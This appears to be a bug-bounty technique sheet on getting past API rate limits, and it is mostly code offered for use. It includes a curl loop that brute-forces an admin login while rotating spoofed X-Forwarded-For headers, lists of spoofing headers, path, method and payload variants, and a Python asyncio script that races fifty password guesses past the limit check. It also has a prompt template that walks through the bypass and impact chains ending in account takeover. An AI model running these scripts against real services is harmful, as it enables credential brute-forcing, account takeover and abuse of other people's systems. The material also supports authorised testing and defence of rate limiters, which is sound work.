---
id: "rate-limiting-bypass"
title: "API Rate Limiting Bypass Techniques"
type: "technique"
category: "api-security"
subcategory: "rate-limiting"
tags: ["rate-limit", "api", "brute-force", "bypass", "enumeration", "abuse", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["business-logic-flaws", "auth-bypass-payloads", "mfa-bypass"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# API Rate Limiting Bypass Techniques

## Why Rate Limit Bypass Matters
Rate limiting is the gate that prevents brute force, credential stuffing, enumeration, and abuse. Bypassing it opens the door to account takeover, data scraping, and financial abuse. Bounties: $2k–$15k+ depending on impact.

## Bypass Techniques

### 1. Header-Based IP Spoofing
```
# Most apps use IP-based rate limiting
# But many trust proxy headers over the actual source IP

X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 1.2.3.FUZZ    # Rotate last octet
X-Real-IP: 10.0.0.1
X-Originating-IP: 192.168.1.1
X-Client-IP: 172.16.0.1
X-Remote-IP: 8.8.8.8
X-Remote-Addr: 1.1.1.1
X-Host: localhost
Forwarded: for=127.0.0.1
True-Client-IP: 1.2.3.4         # Cloudflare
CF-Connecting-IP: 1.2.3.4       # Cloudflare
X-Azure-ClientIP: 1.2.3.4       # Azure
X-Cluster-Client-IP: 1.2.3.4

# Rotate through IPs:
for i in $(seq 1 255); do
  curl -H "X-Forwarded-For: 10.0.0.$i" \
    https://target.com/api/login \
    -d '{"user":"admin","pass":"FUZZ"}'
done
```

### 2. Endpoint Variation
```
# Rate limits are often per-endpoint, not per-action
# The same action accessible via different paths:

POST /api/login
POST /api/v1/login
POST /api/v2/login
POST /api/auth/login
POST /api/user/authenticate
POST /login
POST /api/Login           # Case variation
POST /api/login/          # Trailing slash
POST /api/login?x=1       # Query parameter
POST /api/./login         # Path normalization
POST /api/login%20        # URL encoding
POST /api/login;           # Semicolon
POST /API/LOGIN           # Full uppercase

# GraphQL: Same query through different operation names
# REST: Same resource via different aliases
```

### 3. HTTP Method Switching
```
# Rate limit on POST but not on PUT/PATCH
# Login via POST gets limited, try:
PUT /api/login
PATCH /api/login

# Or the reverse — some endpoints accept GET for what should be POST:
GET /api/login?username=admin&password=FUZZ
```

### 4. Character Padding / Payload Variation
```
# Rate limit keyed on exact request body
# Vary the payload to bypass:

{"username": "admin", "password": "pass1"}
{"username": "admin", "password": "pass2", "extra": "pad1"}
{"username":"admin","password":"pass3"}           # No spaces
{"password": "pass4", "username": "admin"}         # Reorder keys
{"username": "admin ", "password": "pass5"}        # Trailing space
{"username": "ADMIN", "password": "pass6"}         # Case change
{"username": "admin\u0000", "password": "pass7"}   # Null byte

# URL encoding variations for form data:
username=admin&password=pass1
username=%61dmin&password=pass2    # Partial URL encode
username=admin&password=pass3&_=random123  # Cache buster
```

### 5. Account-Level Rate Limit Bypass
```
# Rate limit per-account, not per-IP
# Use email variations for the same inbox:
admin@target.com
admin+1@target.com
admin+test@target.com
Admin@target.com
admin@Target.com
admin@target.com.        # Trailing dot (DNS)

# If phone-based: +1-555-000-1234 vs 15550001234 vs 555-000-1234
```

### 6. Distributed Request Timing
```
# Rate limit: 100 requests per minute
# Strategy: Send 99 requests, wait 61 seconds, repeat

# Or: Send requests at exactly the rate limit boundary
# Rate limit resets at minute boundaries (on the clock)
# Send burst at :59, another burst at :00 = 2x in 2 seconds

# Sliding window bypass:
# If rate limit is 10/minute with sliding window
# Send 10, wait 30s, send 10 more
# The first batch starts expiring at 30s, giving you partial capacity
```

### 7. API Key / Token Rotation
```
# Generate multiple API keys or session tokens
# Distribute requests across them

# Login tokens: Create multiple sessions via different browsers/devices
# API keys: Some apps allow unlimited API key creation
# OAuth tokens: Generate new tokens per request via refresh flow
```

### 8. Content-Type Bypass
```
# Rate limit on application/json but not on:
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: text/xml
Content-Type: application/xml

# Same data, different encoding — often hits a different rate limiter
```

### 9. Chunked Transfer Encoding
```
# Slow-rate attacks to stay under rate limits
# Send request body in tiny chunks with delays

Transfer-Encoding: chunked

1
{
1
"
5
user"
...

# Each chunk keeps the connection alive
# The request takes 30+ seconds to complete
# But only counts as 1 request to the rate limiter
```

### 10. Race Condition on Rate Limit Check
```python
# If rate limit check and increment aren't atomic:
# Send burst of requests simultaneously
# They all pass the check before any increment the counter

import asyncio
import httpx

async def race_rate_limit():
    async with httpx.AsyncClient() as client:
        tasks = [
            client.post("https://target.com/api/login", 
                json={"username": "admin", "password": f"pass{i}"},
                headers={"X-Forwarded-For": "1.2.3.4"})
            for i in range(50)
        ]
        results = await asyncio.gather(*tasks)
        
        non_429 = [r for r in results if r.status_code != 429]
        print(f"Requests that bypassed rate limit: {len(non_429)}/{len(results)}")

asyncio.run(race_rate_limit())
```

### 11. Mobile/App Endpoint
```
# Mobile API endpoints often have different (or no) rate limits

# Use mobile User-Agent:
User-Agent: TargetApp/4.0 (iPhone; iOS 17.0)

# Use mobile API base:
POST /mobile/api/login
POST /api/mobile/login
POST /m/api/login

# Internal/partner API (if discoverable):
POST /internal/api/login
POST /partner/api/login
```

## Testing Methodology
```
1. Identify the rate limit: Send requests until you get 429
2. Note the limit (X requests per Y seconds) and reset behavior
3. Try each bypass technique systematically
4. For each that works: demonstrate impact (brute force, enumeration)
5. Chain with other bugs (rate limit bypass + weak password policy = ATO)
```

## Deep Dig Prompts
```
Given this rate-limited endpoint [describe]:
1. Determine if rate limit is IP-based, account-based, or session-based
2. Test all header-based IP spoofing (X-Forwarded-For and 12 variants)
3. Try endpoint variations (path, method, encoding)
4. Test timing-based bypass (boundary reset, sliding window)
5. Demonstrate impact: how many additional attempts does bypass allow?
```

## Impact Escalation
- Rate limit bypass on login → brute force → account takeover
- Rate limit bypass on OTP → MFA bypass → account takeover
- Rate limit bypass on API → data scraping → privacy violation
- Rate limit bypass on coupon → unlimited discounts → financial loss
- Rate limit bypass on SMS/email → abuse for spam/cost → financial loss
